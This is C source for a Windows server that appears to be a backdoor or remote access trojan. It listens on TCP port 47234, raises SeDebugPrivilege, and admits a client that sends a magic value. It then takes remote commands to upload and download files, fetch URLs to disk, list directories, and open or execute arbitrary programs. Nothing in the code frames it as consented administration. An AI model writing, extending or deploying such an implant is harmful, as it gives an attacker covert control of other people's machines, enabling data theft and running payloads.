#include <stdio.h>
#include <Winsock2.h>
#include <string.h>
#include <shellapi.h>
#include "netfile.h"
#include "url.h"
#include "file_sys.h"
#define MAX_NAME 256
#define PORT 47234
BOOL promoteProcessPrivileges(const TCHAR* newPrivileges);
void OpenExefile(const TCHAR* str);

void GetIp(char* rip) {
	char szHost[MAX_NAME];
	struct hostent* phost;
	char *ip = NULL;
	gethostname(szHost,MAX_NAME);
	phost = gethostbyname(szHost);
	printf("%s\n",szHost);
	ip = inet_ntoa(*(struct in_addr*)phost->h_addr_list);
	printf("%s\n%s\n",phost->h_name,ip);
	strcpy(rip,ip);
}

void ProcessMsg(SOCKET client) {
	static char buf[256];
	int nRunning = 1;
	FILE* tmpf=NULL;
	tmpf = fopen(SERVERTEMPNAME,"wb");
	fclose(tmpf);
	send(client,_current_path,256,0);
	while(nRunning) {
		recv(client,buf,256,0);

		if(*buf=='e'&&!strcmp(buf,"exit")) {
			nRunning = 0;
		}
		switch(*buf) {
		case 'o':
			if(!strncmp(buf,"open ",5)) {
				ShellExecute(NULL, "open", buf+5, NULL, NULL, SW_SHOWNORMAL);
			} else {
				printf("%s\r\n",buf);
			}
			break;
		case 'u':
			if(!strncmp(buf,"upload ",7)) {
				printf("client is upload file...\n");
				DownFile(client);
				printf("down file ok!!!\n");
			} else if(!strncmp(buf,"url ",4)) {
				if(URL_Down(buf+4)) {
					strcpy(buf,"down it failed!");
					send(client,buf,16,0);
				}else {
					strcpy(buf,"down it ok!");
					send(client,buf,16,0);
				}
			} else {
				printf("%s\r\n",buf);
			}
			break;
		case 'd':
			if(!strncmp(buf,"down ",5) ) {
				printf("client is down file:%s\n",buf+5);
				UploadFile(client,buf+5,0);
			} else if(!strncmp(buf,"dir",3)&&!buf[4] ) {
				if(tmpf) {
					fclose(tmpf);
				}
				tmpf = fopen(SERVERTEMPNAME,"w+b");
				EchoDir(_current_path,tmpf);
				fflush(tmpf);
				rewind(tmpf);
				UploadFile2(client,tmpf,CLIENTTEMPNAME,0);
				fclose(tmpf);
				tmpf = NULL;
			}else {
				printf("%s\r\n",buf);
			}
			break;
		case 'l':
			if(!strncmp(buf,"ls",2)&&!buf[3] ) {
				if(tmpf) {
					fclose(tmpf);
				}
				tmpf = fopen(SERVERTEMPNAME,"w+b");
				EnumDir(_current_path,tmpf);
				fflush(tmpf);
				rewind(tmpf);
				UploadFile2(client,tmpf,CLIENTTEMPNAME,0);
				fclose(tmpf);
				tmpf = NULL;
			} else {
				printf("%s\r\n",buf);
			}
			break;
			break;
		case 'c':
			if(!strncmp(buf,"call ",5)) {
				OpenExefile(buf+5);
			} else {
				printf("%s\r\n",buf);
			}
			break;
		default:
			printf("%s\r\n",buf);
			break;
		}
	}
	if(tmpf)
		fclose(tmpf);
	remove(SERVERTEMPNAME);	
}
int main(int argc,char** argv) {
	WSADATA wsadata;
	struct sockaddr_in sockaddr;
	SOCKET s,clientsock;
	SOCKADDR clientaddr;
	int nSize;
	WSAStartup(MAKEWORD(2,2),&wsadata);
	promoteProcessPrivileges("SeDebugPrivilege");
	Init_CurrentPath();
	s = socket(PF_INET,SOCK_STREAM,IPPROTO_TCP);
	sockaddr.sin_family = AF_INET;
	sockaddr.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	sockaddr.sin_port = htons(PORT);

	bind(s,(SOCKADDR*)&sockaddr,sizeof(SOCKADDR));
	listen(s,5);
	nSize = sizeof(SOCKADDR);
	while(1) {
		clientsock = accept(s,(SOCKADDR*)&clientaddr,&nSize);
		recv(clientsock,(char*)&nSize,4,0);
		if(nSize == 0x12345678) {
			printf("a client is linked\n");
			break;
		} else {
			printf("a client is connected but faied\n");
			closesocket(clientsock);
		}
	}
	ProcessMsg(clientsock);
	closesocket(clientsock);
	closesocket(s);
	WSACleanup();
	
	return 0;
}
